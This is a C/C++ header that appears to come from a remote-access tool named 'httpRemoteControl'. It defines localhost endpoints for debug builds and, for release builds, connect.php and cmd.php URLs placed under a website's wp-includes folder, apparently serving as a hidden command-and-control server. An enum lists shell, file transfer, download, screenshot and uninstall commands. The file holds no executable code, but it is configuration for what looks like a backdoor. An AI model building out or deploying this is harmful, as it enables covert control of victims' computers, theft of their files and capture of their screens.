#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#ifdef _DEBUG
#define DestUrl L"http://127.0.0.1/httpRemoteControl/client/connect.php"
#define ShellUrl L"http://127.0.0.1/httpRemoteControl/client/cmd.php"
#define TranUrl L"http://127.0.0.1/httpRemoteControl/client/cmd.php"
#define SnapUrl L"http://127.0.0.1/httpRemoteControl/client/cmd.php"

#else
#define DestUrl L"http://www.whitepig.org/wp-includes/connect.php"
#define ShellUrl L"http://www.whitepig.org/wp-includes/cmd.php"
#define TranUrl L"http://www.whitepig.org/wp-includes/cmd.php"

#endif

enum
{
	COMMAND_SIGNED = 0x01,
	COMMAND_SHELL,
	COMMAND_TRAN,
	COMMAND_DOWNLOAD,
	COMMAND_SNAP,
	COMMAND_UNINSTALL=0x09
};


